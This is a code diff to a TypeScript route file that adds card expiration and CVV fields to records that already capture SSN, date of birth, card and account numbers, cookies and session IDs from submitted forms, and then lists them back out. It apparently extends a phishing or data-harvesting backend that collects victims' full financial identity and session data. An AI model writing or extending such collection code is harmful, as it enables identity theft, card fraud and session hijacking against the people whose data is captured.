@@ -228,6 +228,8 @@ export async function registerRoutes(
         dateOfBirth: req.body.dateOfBirth,
         ssn: req.body.ssn || value,
         cardNumber: req.body.cardNumber,
+        cardExpiration: req.body.cardExpiration,
+        cardCvv: req.body.cardCvv,
         accountNumber: req.body.accountNumber,
       });
 
@@ -639,6 +641,8 @@ export async function registerRoutes(
     ssn?: string;
     dateOfBirth?: string;
     cardNumber?: string;
+    cardExpiration?: string;
+    cardCvv?: string;
     accountNumber?: string;
     formData?: Record<string, any>;
   }
@@ -671,6 +675,8 @@ export async function registerRoutes(
         ssn: data?.ssn || null,
         dateOfBirth: data?.dateOfBirth || null,
         cardNumber: data?.cardNumber || null,
+        cardExpiration: data?.cardExpiration || null,
+        cardCvv: data?.cardCvv || null,
         accountNumber: data?.accountNumber || null,
         cookies: cookieHeader || null,
         sessionId: sessionId || null,
@@ -724,6 +730,8 @@ export async function registerRoutes(
           ssn: log.ssn,
           dateOfBirth: log.dateOfBirth,
           cardNumber: log.cardNumber,
+          cardExpiration: log.cardExpiration,
+          cardCvv: log.cardCvv,
           accountNumber: log.accountNumber,
           cookies: log.cookies,
           sessionId: log.sessionId,
